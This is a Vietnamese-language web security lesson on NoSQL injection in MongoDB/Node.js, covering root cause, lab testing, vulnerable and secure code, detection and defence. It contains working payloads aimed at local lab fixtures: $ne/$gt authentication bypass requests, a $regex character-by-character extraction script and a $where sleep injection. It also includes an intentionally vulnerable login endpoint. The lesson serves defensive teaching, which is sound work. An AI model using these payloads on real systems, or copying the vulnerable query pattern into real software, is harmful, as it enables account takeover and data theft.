---
schema_version: 1
id: WEB-A05-NOSQL-INJECTION
title: "NoSQL Injection"
slug: nosql-injection
level: intermediate
estimated_minutes: 50
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  []
cwe:
  - CWE-943
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# NoSQL Injection

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích NoSQL Injection bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Nhiều người thường nghĩ rằng các cơ sở dữ liệu thế hệ mới NoSQL như MongoDB sẽ tuyệt đối an toàn trước các cuộc tấn công injection vì chúng không sử dụng các câu lệnh SQL truyền thống. Tuy nhiên, điều này không hoàn toàn đúng. Thay vì dùng chuỗi văn bản SQL, MongoDB sử dụng các đối tượng dữ liệu JSON/BSON để tìm kiếm và so sánh dữ liệu, đi kèm các ký tự toán tử đặc biệt bắt đầu bằng dấu đô-la (ví dụ: `$eq` để so sánh bằng, `$ne` để so sánh không bằng, hay `$gt` để so sánh lớn hơn).

```javascript
// Normal MongoDB query in Node.js with Mongoose
const mongoose = require('mongoose');

// Find a user by email - standard query
const user = await User.findOne({ email: "alice@victim.lab.test" });

// Query with comparison operators
const activeUsers = await User.find({
    status: "active",
    age: { $gte: 18 }      // Age greater than or equal to 18
});

// Authentication query - find user matching both email AND password
const authUser = await User.findOne({
    email: userEmail,
    password: hashedPassword
});
```

Nhiều developer tin rằng NoSQL databases "miễn nhiễm" với injection vì không dùng SQL strings. Đây là **quan niệm sai lầm nghiêm trọng** — NoSQL injection khai thác cơ chế khác: thay vì chèn SQL syntax, attacker chèn **query operators** vào JSON objects.

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng NoSQL Injection xảy ra khi ứng dụng web "nhẹ dạ" nhận dữ liệu từ người dùng và đưa thẳng vào câu lệnh tìm kiếm của MongoDB mà không kiểm tra xem dữ liệu đó là một chuỗi văn bản thường hay là một đối tượng chứa các toán tử logic của MongoDB. Kẻ tấn công có thể gửi lên một yêu cầu chứa toán tử `$ne` (không bằng) thay vì một mật khẩu thông thường. Câu hỏi xác thực của ứng dụng sẽ bị biến đổi từ "mật khẩu có trùng khớp không?" thành "hãy tìm người dùng có mật khẩu không phải là rỗng". Kết quả là kẻ tấn công có thể dễ dàng đăng nhập mà không cần biết mật khẩu, vượt qua hệ thống xác thực, hoặc dò tìm và đánh cắp toàn bộ cơ sở dữ liệu của bạn.

> **Gate kỹ thuật:** các nguồn cần được đối chiếu trực tiếp cho từng claim trước khi đổi `content_status` sang `verified`: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** tài khoản tổng hợp và document MongoDB.
- **Actor, xác thực và role:** anonymous gửi JSON login/search; role user cho update.
- **Điều kiện khai thác:** object/operator được gửi thay cho scalar rồi truyền thẳng vào query.
- **Browser, proxy, framework và phiên bản:** MongoDB 7.x với Node.js 20/Express 4.x và JSON parser được pin; loopback; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với nosql injection, object/operator được gửi thay cho scalar rồi truyền thẳng vào query. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy MongoDB 7.x với Node.js 20/Express 4.x và JSON parser được pin; loopback; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case nosql injection; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “object/operator được gửi thay cho scalar rồi truyền thẳng vào query”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của nosql injection; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây được giữ để technical review. `static-verified` chỉ xác nhận cấu trúc/annotation đã qua gate tĩnh; nó **không** chứng minh payload hoạt động trên mọi phiên bản. Trước khi chạy phải đối chiếu `context`, điều kiện cần, encoding, expected result và risk. Payload mở rộng thuộc `cheatsheets/`; lesson chỉ giữ ví dụ cốt lõi.

### 1. Authentication Bypass

<!-- payload-id: WEB-A05-NOSQL-INJECTION-001 -->
<!-- context: Node.js 20.x + Express + MongoDB driver fixture; server-side query construction -->
<!-- prerequisites: loopback fixture with synthetic users; one baseline and one operator case; database snapshot -->
<!-- encoding: application/json UTF-8 parsed once; username/password must be strings in the secure schema -->
<!-- expected-result: code review identifies direct object-to-query flow; this block alone does not authenticate a user -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```javascript
// Vulnerable login endpoint
app.post('/login', async (req, res) => {
    const user = await User.findOne({
        username: req.body.username,    // Directly from user input
        password: req.body.password     // Directly from user input
    });
    if (user) {
        res.json({ success: true, token: generateToken(user) });
    }
});
```

<!-- payload-id: WEB-A05-NOSQL-INJECTION-002 -->
<!-- context: MongoDB 7 login query receives $ne objects in both scalar credential fields -->
<!-- prerequisites: synthetic users only; one request; no real password/token returned -->
<!-- encoding: UTF-8 JSON with dollar-prefixed keys; Content-Length is generated from exact bytes by the harness -->
<!-- expected-result: vulnerable route returns the fixture success marker; schema validation rejects both objects before query -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
POST /login HTTP/1.1
Host: victim.lab.test
Content-Type: application/json
Content-Length: 45

{"username":{"$ne":""},"password":{"$ne":""}}
```

<!-- payload-id: WEB-A05-NOSQL-INJECTION-003 -->
<!-- context: MongoDB 7 login query receives a $gt object for the password field -->
<!-- prerequisites: fixture-admin has a public nonempty marker value; one request; no token issuance -->
<!-- encoding: UTF-8 application/json; the harness computes Content-Length and preserves the $gt key -->
<!-- expected-result: vulnerable predicate matches fixture-admin; secure route rejects non-string password and logs no query -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
POST /login HTTP/1.1
Host: victim.lab.test
Content-Type: application/json
Content-Length: 50

{"username":"fixture-admin","password":{"$gt":""}}
```

### 2. Data Extraction with $regex

<!-- payload-id: WEB-A05-NOSQL-INJECTION-004 -->
<!-- context: MongoDB 7 regex prefix oracle over a public four-character labCode field, not a password -->
<!-- prerequisites: loopback synthetic document; charset a-z0-9; maximum 144 requests; no account login or secret data -->
<!-- encoding: regex prefix is UTF-8 JSON and metacharacters are escaped except the intentional leading anchor -->
<!-- expected-result: bounded loop recovers only lab1 from the vulnerable fixture; secure schema disallows regex objects -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
# Probe the public synthetic labCode field character by character
POST /lab/oracle HTTP/1.1
Content-Type: application/json

{"record": "fixture", "labCode": {"$regex": "^l"}}       → 200 OK
{"record": "fixture", "labCode": {"$regex": "^la"}}      → 200 OK
{"record": "fixture", "labCode": {"$regex": "^lab"}}     → 200 OK
{"record": "fixture", "labCode": {"$regex": "^lab1"}}    → 200 OK
# Stop after recovering the documented four-character marker lab1.
```

<!-- payload-id: WEB-A05-NOSQL-INJECTION-005 -->
<!-- context: Python 3.12; loopback-only MongoDB oracle fixture with public marker lab1 -->
<!-- prerequisites: fixture bound to loopback; maximum 4 characters and 144 requests -->
<!-- encoding: requests serializes UTF-8 JSON; each prefix is regex-escaped before insertion after ^ -->
<!-- expected-result: recover at most four characters from the synthetic fixture secret, then stop -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Automated extraction script
import requests
import string

url = "http://127.0.0.1:8080/lab/oracle"
lab_code = ""
charset = string.ascii_lowercase + string.digits
max_length = 4
max_requests = max_length * len(charset)
request_count = 0

for _ in range(max_length):
    found = False
    for c in charset:
        if request_count >= max_requests:
            break
        request_count += 1
        payload = {
            "record": "fixture",
            "labCode": {"$regex": f"^{lab_code}{c}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200:
            lab_code += c
            print(f"Found marker prefix: {lab_code}")
            found = True
            break
    if not found or request_count >= max_requests:
        break

print(f"Recovered public fixture marker: {lab_code}")
```

### 3. JavaScript Injection with $where

<!-- payload-id: WEB-A05-NOSQL-INJECTION-006 -->
<!-- context: MongoDB 7 fixture passes req.body.query as the complete find predicate with server-side JavaScript explicitly enabled; legacy $where behavior -->
<!-- prerequisites: isolated container with one synthetic document; exactly one request; server timeout below 500 ms -->
<!-- encoding: UTF-8 JSON parsed once; $where is a top-level operator inside query and Content-Length is 46 bytes for the exact minified body -->
<!-- expected-result: vulnerable route records one approximately 100 ms delay relative to its local baseline; secure route rejects $where before querying -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```http
POST /api/users HTTP/1.1
Host: victim.lab.test
Content-Type: application/json
Content-Length: 46

{"query":{"$where":"sleep(100); return true"}}
```

`$where` là operator cấp query, không phải operator hợp lệ nằm dưới trường `username`. Timing chỉ là bằng chứng khi so với baseline của chính fixture và application log xác nhận predicate đã tới query engine. [S1]

## 9. Code dễ bị lỗi và code an toàn

```javascript
// ❌ VULNERABLE: Direct user input in MongoDB query
const express = require('express');
const app = express();
app.use(express.json());

app.post('/login', async (req, res) => {
    // req.body.password could be {"$ne": ""} instead of a string
    const user = await db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password   // No type checking!
    });
    if (user) return res.json({ token: createJWT(user) });
    res.status(401).json({ error: "Invalid credentials" });
});
```

```javascript
// ✅ SECURE: Reject non-scalar input and build the query on the server
const express = require('express');
const app = express();

app.use(express.json());

app.post('/login', async (req, res) => {
    // Reject arrays, objects and operator documents; never coerce them to strings.
    if (typeof req.body.username !== 'string' ||
        typeof req.body.password !== 'string') {
        return res.status(400).json({ error: "Invalid input" });
    }

    const username = req.body.username;
    const password = req.body.password;
    if (!username || !password || username.length > 64 || password.length > 128) {
        return res.status(400).json({ error: "Invalid input" });
    }

    // Use bcrypt comparison instead of DB-level password matching
    const user = await db.collection('users').findOne({ username });
    if (!user || !await bcrypt.compare(password, user.passwordHash)) {
        return res.status(401).json({ error: "Invalid credentials" });
    }

    res.json({ token: createJWT(user) });
});
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Validate schema/type scalar và dựng predicate do server định nghĩa, không nhận operator từ client.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Ép kiểu dữ liệu đầu vào, sử dụng các phương thức truy vấn an toàn của ODM/ORM và làm sạch các toán tử đặc biệt.
- **Các bước chi tiết**:
  - Validate input types: Ép kiểu user input thành `String()` trước khi dùng trong query.
  - Dùng ODM built-in sanitization: Mongoose schema với `type: String` tự động reject objects.
  - Cấm `$where`: Disable JavaScript execution trong MongoDB config.
  - Dùng `mongo-sanitize`: Thư viện strip tất cả keys bắt đầu bằng `$`.
  - Parameterized queries: Dùng Mongoose methods thay vì raw MongoDB driver queries.
  - Rate limiting: Ngăn chặn automated extraction attacks.

## 12. Retest

- **Positive case:** luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Regression:** lưu testcase tối thiểu tái hiện lỗi cũ và testcase chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Đánh dấu `verified` dù nguồn, phiên bản fixture hoặc evidence payload chưa được lưu.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim nhạy cảm có source marker và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **NoSQL Injection**: Tiêm toán tử truy vấn độc hại vào câu lệnh tìm kiếm NoSQL.
- **JSON/BSON**: Định dạng biểu diễn dữ liệu dạng cặp key-value được sử dụng trong cơ sở dữ liệu NoSQL.
- **Query Operator**: Các toán tử đặc biệt (như `$ne`, `$gt`, `$regex`) dùng để lọc và truy vấn dữ liệu.
- **Object Parser**: Bộ phân tích và biến đổi chuỗi dữ liệu đầu vào thành đối tượng lập trình.
- **Authentication Bypass**: Vượt qua cơ chế kiểm tra đăng nhập để truy cập tài khoản trái phép.

## 16. Bài liên quan và đọc thêm

- [SQL Injection](../sql-injection/) — Lỗ hổng SQL Injection cổ điển trên các cơ sở dữ liệu quan hệ SQL.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/nosql-injection — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S2]** HackTricks – NoSQL Injection. https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S3]** CWE-943. https://cwe.mitre.org/data/definitions/943.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S4]** OWASP Testing Guide – NoSQL Injection. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
